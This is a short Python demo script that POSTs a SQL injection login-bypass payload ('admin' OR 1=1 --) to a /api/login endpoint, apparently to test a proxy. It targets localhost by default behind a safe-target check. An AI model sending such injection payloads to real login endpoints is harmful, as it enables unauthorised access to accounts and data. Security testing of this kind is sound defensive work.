from __future__ import annotations

import os
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parent.parent))

from scripts._common import require_safe_target, send


def run() -> None:
    base = os.getenv("NG_PROXY_URL", "http://localhost:8000")
    require_safe_target(base)
    payload = {"username": "admin' OR 1=1 --", "password": "x"}
    response = send(base, "POST", "/api/login", json=payload)
    print("SQLi demo status:", response.status_code)
    print(response.text[:200])


if __name__ == "__main__":
    run()
